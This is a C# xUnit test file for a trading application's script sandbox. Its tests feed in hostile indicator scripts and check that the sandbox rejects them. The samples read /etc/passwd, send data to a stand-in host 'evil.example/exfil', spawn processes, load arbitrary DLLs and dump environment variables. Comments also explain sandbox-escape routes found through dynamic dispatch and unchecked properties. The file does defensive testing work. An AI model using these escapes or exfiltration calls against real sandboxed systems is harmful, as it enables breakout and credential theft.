using System;
using System.Linq;
using System.Threading.Tasks;
using AccessibleTrader.Core.Services;
using AccessibleTrader.Core.Services.Scripting;
using Xunit;

namespace AccessibleTrader.Tests;

/// <summary>
/// Defense-in-depth tests for the phase-4 script sandbox. Each test
/// compiles an indicator that deliberately reaches for a blocked
/// capability (filesystem, network, process-spawn, unsafe code, P/Invoke)
/// and asserts the compile is rejected with a sandbox-origin error.
///
/// <para>
/// These exercise the in-worker Roslyn semantic sandbox +
/// lexical pre-flight — the first layer in the defense stack. They
/// run on any platform (the compile pipeline is platform-agnostic),
/// unlike the OS-level AppContainer / sandbox-exec / isolatedProcess
/// layers which can only be verified on their target OS. If any test
/// here starts passing (i.e. the compile succeeds when it should fail)
/// that's a direct regression of the semantic sandbox — the second-layer
/// OS sandbox would still block runtime execution, but defense-in-depth
/// has lost a layer and needs fixing.
/// </para>
///
/// <para>
/// **Every test here used to assert only <c>Success == false</c>, with no positive control in
/// the file.** That is green under ANY universal compile failure — a broken implicit-usings
/// injection (none of the sources below declare their own <c>using</c>s), a Roslyn reference
/// resolution failure, a renamed SDK interface. Six sandbox-escape tests would all have gone on
/// passing while the sandbox they claim to exercise was never reached. The docstring's own claim
/// was "rejected with a sandbox-origin error", so that is now what is asserted:
/// <see cref="AssertRejectedBySandbox"/> requires the diagnostic to come from the lexical
/// pre-flight or the semantic walker, and <see cref="A_benign_indicator_is_not_refused_by_the_sandbox"/>
/// is the control proving a legal script gets all the way past both.
/// </para>
///
/// <para>
/// Message wording is still not pinned exactly — the marker phrases below are the two shapes
/// the sandbox emits, and if they change, a test failing here is the correct outcome rather
/// than a coupling problem: it means the sandbox's own diagnostics changed.
/// </para>
/// </summary>
public class HostileScriptTests
{
    /// <summary>The two shapes a sandbox refusal takes: "Blocked: …" from the lexical
    /// pre-flight, and the semantic walker's per-symbol reports.</summary>
    private static bool IsSandboxOrigin(string error) =>
        error.Contains("Blocked:", StringComparison.Ordinal)
        || error.Contains("is not allowed in user scripts", StringComparison.Ordinal)
        || error.Contains("is in blocked namespace", StringComparison.Ordinal);

    /// <summary>
    /// Asserts the compile was refused BY THE SANDBOX — not by a compile error that would refuse
    /// a legal script too. Prints the diagnostics on failure, because "it failed for some other
    /// reason" is the interesting case and is otherwise invisible.
    /// </summary>
    private static void AssertRejectedBySandbox(CompileResult result, string what)
    {
        string errors = string.Join("\n  ", result.Errors ?? Array.Empty<string>());

        Assert.False(result.Success, $"Sandbox regression: {what} compiled successfully.");
        Assert.True(result.Errors is { Length: > 0 }, $"{what} was refused with no diagnostic at all.");
        Assert.True(result.Errors!.Any(IsSandboxOrigin),
            $"{what} was refused, but NOT by the sandbox — so this test would stay green with the "
          + $"sandbox removed. Diagnostics were:\n  {errors}");
    }

    private static RoslynScriptingService NewScripting() =>
        new RoslynScriptingService(
            workerLauncher: new DefaultProcessLauncher(),
            // Bogus path — these tests expect compile-time rejection, so
            // we should never reach the worker-spawn step. If we do, the
            // File.Exists check fires a clear diagnostic.
            workerPathResolver: () => "/__hostile_script_test_never_used__");

    [Fact]
    public async Task Rejects_FileSystemAccess_ViaFileClass()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_FS";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    // Direct reference to System.IO.File — should be refused
                    // by the semantic sandbox walker before Emit.
                    var _ = System.IO.File.ReadAllText("/etc/passwd");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "a direct System.IO.File reference");
    }

    [Fact]
    public async Task Rejects_HttpClient()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_HTTP";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    using var http = new System.Net.Http.HttpClient();
                    var _ = http.GetStringAsync("https://evil.example/exfil").Result;
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "System.Net.Http.HttpClient");
    }

    [Fact]
    public async Task Rejects_ProcessStart()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_PROC";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    System.Diagnostics.Process.Start("calc.exe");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "System.Diagnostics.Process.Start");
    }

    [Fact]
    public async Task Rejects_UnsafeBlock_ViaLexicalPreflight()
    {
        const string src = """
            public sealed unsafe class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_UNSAFE";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    int x = 42;
                    int* p = &x;
                    return new[] { new double[] { *p } };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "unsafe code");
    }

    [Fact]
    public async Task Rejects_DllImport_ViaLexicalPreflight()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_DLLIMPORT";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                [System.Runtime.InteropServices.DllImport("kernel32.dll")]
                private static extern uint GetCurrentProcessId();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    return new[] { new double[] { GetCurrentProcessId() } };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "[DllImport] P/Invoke");
    }

    [Fact]
    public async Task Rejects_AssemblyLoad_ReflectionBypass()
    {
        // A classic escape attempt: use reflection to load an arbitrary
        // assembly. The semantic sandbox should recognise the
        // System.Reflection.Assembly.LoadFrom reference and refuse.
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_REFLECT";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    var asm = System.Reflection.Assembly.LoadFrom("/tmp/evil.dll");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(src),
            "System.Reflection.Assembly.LoadFrom");
    }

    /// <summary>
    /// The positive control this file did not have.
    ///
    /// <para>
    /// A LEGAL indicator, compiled through the same factory with the same bogus worker path.
    /// It must get past the lexical pre-flight, past the semantic walker, and past Roslyn — and
    /// then fail only at the worker-spawn step, on the missing executable. If this ever starts
    /// reporting a sandbox diagnostic, or an ordinary compile error, then the six refusals above
    /// prove nothing: whatever refuses this would refuse them.
    /// </para>
    /// </summary>
    [Fact]
    public async Task A_benign_indicator_is_not_refused_by_the_sandbox()
    {
        const string src = """
            public sealed class BenignIndicator : ICustomIndicator
            {
                public string Id => "BENIGN";
                public string DisplayName => "benign";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    var outp = new double[data.Length];
                    for (int i = 0; i < data.Length; i++) outp[i] = data[i].Close;
                    return new[] { outp };
                }
            }
            """;

        var scripting = NewScripting();
        var result = await scripting.CompileIndicatorAsync(src);
        string errors = string.Join("\n  ", result.Errors ?? Array.Empty<string>());

        // The load-bearing half: nothing here is refused by the sandbox.
        Assert.DoesNotContain(result.Errors ?? Array.Empty<string>(), IsSandboxOrigin);

        // …and it got all the way past Roslyn, to the point of needing a worker. Which of the two
        // shapes below happens depends on whether ACCESSIBLETRADER_SCRIPT_IN_PROCESS is set, and
        // OutOfProcessScriptingTests sets it process-wide for the length of one of its tests — so
        // pinning only one of them makes this test fail whenever the two happen to overlap.
        // Either outcome proves the same thing: the pre-flight, the walker and the compile all
        // passed on a legal script.
        if (result.Success)
        {
            Assert.NotNull(result.Indicator);           // in-process opt-in was on
            scripting.UnloadScript(result.Indicator!.Id);
        }
        else
        {
            Assert.Contains("__hostile_script_test_never_used__", errors);
        }
    }

    // ── The escapes found by compiling them, 2026-08-25 ──────────────────────────────────
    //
    // Everything above was written against shapes the sandbox was designed to refuse. These
    // five were found the other way round: by compiling a list of candidate escapes and
    // reading which ones came back "compiled successfully". Four of the five did.

    /// <summary>
    /// Both halves of the dynamic escape, because they fail differently.
    ///
    /// <para>
    /// The walker's strength — it works on resolved symbols, so it sees through usings,
    /// aliases and whitespace — is exactly its weakness: a dynamic member access resolves to
    /// no symbol, so every check returned early and the whole blocklist was off. The static
    /// spelling of the first case here is refused on its first token; the dynamic spelling
    /// compiled and reached the worker.
    /// </para>
    /// </summary>
    [Theory]
    [InlineData("dynamic asm = typeof(object).Assembly; var t = asm.GetType(\"System.Diagnostics.Process\"); var _ = t.ToString();")]
    [InlineData("dynamic o = new object(); var _ = o.GetType().Assembly.Location;")]
    [InlineData("object o = new object(); var _ = ((dynamic)o).GetHashCode();")]
    public async Task Rejects_DynamicDispatch(string body)
    {
        ForceLoadTheAssembliesThatMakeThisReachable();
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(Wrap(body)),
            "a dynamic member access");
    }

    /// <summary>
    /// <c>Environment.GetEnvironmentVariables()</c> hands a script the entire environment block
    /// of the process that launched it. On a machine that configures credentials that way, that
    /// is the credentials — and the script does not need to name a blocked namespace to get
    /// there. <c>CurrentDirectory</c> is here as the PROPERTY case: the blocked-member check
    /// looked at methods only, so a property could not have been listed even if someone had
    /// thought to list it.
    /// </summary>
    [Theory]
    [InlineData("var _ = System.Environment.GetEnvironmentVariable(\"PATH\");")]
    [InlineData("var _ = System.Environment.GetEnvironmentVariables();")]
    [InlineData("var _ = System.Environment.CurrentDirectory;")]
    [InlineData("var _ = System.AppContext.BaseDirectory;")]
    public async Task Rejects_ReadingTheHostEnvironment(string body)
    {
        AssertRejectedBySandbox(await NewScripting().CompileIndicatorAsync(Wrap(body)),
            "a read of the host environment");
    }

    /// <summary>
    /// In the worker, stdout IS the IPC pipe. A script's <c>Console.WriteLine</c> writes text
    /// into the middle of the binary frame stream. The runtime half of this is
    /// <c>WorkerDispatcher.IsolateConsole</c> — which is what actually makes it safe, and what
    /// keeps a debug print reaching the log — but the compile-time refusal is what TELLS the
    /// author, instead of silently swallowing their output.
    /// </summary>
    [Fact]
    public async Task Rejects_ConsoleWrites()
    {
        ForceLoadTheAssembliesThatMakeThisReachable();
        AssertRejectedBySandbox(
            await NewScripting().CompileIndicatorAsync(Wrap("System.Console.WriteLine(\"hi\");")),
            "a Console write");
    }

    /// <summary>
    /// Kept, but no longer load-bearing — and the difference is the point.
    ///
    /// <para>
    /// When these tests were written the reference set was built by scanning the assemblies the
    /// HOST had already loaded, so whether an escape could even be NAMED varied with load order:
    /// in a bare test process neither Microsoft.CSharp nor System.Console was loaded, both cases
    /// failed with an ordinary compile error, and the hole was invisible. Forcing the loads was
    /// what made these tests exercise the dangerous configuration. Since the set became a fixed
    /// declared list (see <see cref="ScriptReferenceSetTests"/>) there is no dangerous
    /// configuration to reach for: <c>System.Console</c> is always referenced and
    /// <c>Microsoft.CSharp</c> never is. The calls stay because a refusal that survives the host
    /// having those assemblies loaded is strictly the stronger claim.
    /// </para>
    /// </summary>
    private static void ForceLoadTheAssembliesThatMakeThisReachable()
    {
        _ = typeof(Microsoft.CSharp.RuntimeBinder.Binder).Name;
        _ = Console.Out;
    }

    /// <summary>Wraps a Calculate body in the smallest legal indicator.</summary>
    private static string Wrap(string body) => $$"""
        public sealed class ProbeIndicator : ICustomIndicator
        {
            public string Id => "PROBE";
            public string DisplayName => "probe";
            public string[] ComponentNames => new[] { "x" };
            public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
            public Dictionary<string, double> DefaultParameters => new();

            public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
            {
                {{body}}
                return new[] { new double[data.Length] };
            }
        }
        """;

    /// <summary>
    /// A blocked PROPERTY, which is the case the member check was structurally unable to make
    /// until 2026-08-25: it looked at <c>IMethodSymbol</c> only, so the list could contain
    /// nothing but methods and nobody would have noticed the omission. Holding an Assembly was
    /// legal as long as you never touched it — this refuses it at the first token instead of
    /// the second.
    /// </summary>
    [Fact]
    public async Task Rejects_HoldingAnAssemblyObjectAtAll()
    {
        // NOT `var a = typeof(object).Assembly` — `var` is itself an identifier that resolves to
        // System.Reflection.Assembly, so the namespace rule catches that spelling and the test
        // would pass with the property rule deleted. Widening to `object` removes every symbol
        // in the statement except the property itself. (Found by deleting the rule and watching
        // the first draft stay green.)
        AssertRejectedBySandbox(
            await NewScripting().CompileIndicatorAsync(Wrap("object a = typeof(object).Assembly; var _ = a;")),
            "a Type.Assembly read");
    }

    /// <summary>
    /// The control for the two Theories above: the same wrapper, doing something legal, must
    /// still get past the sandbox. Without this, a wrapper that failed to compile for its own
    /// reasons would make every case above pass for the wrong reason.
    /// </summary>
    [Fact]
    public async Task The_probe_wrapper_itself_is_not_refused()
    {
        ForceLoadTheAssembliesThatMakeThisReachable();
        var result = await NewScripting().CompileIndicatorAsync(
            Wrap("double s = 0; for (int i = 0; i < data.Length; i++) s += data[i].Close;"));

        Assert.DoesNotContain(result.Errors ?? Array.Empty<string>(), IsSandboxOrigin);
    }
}
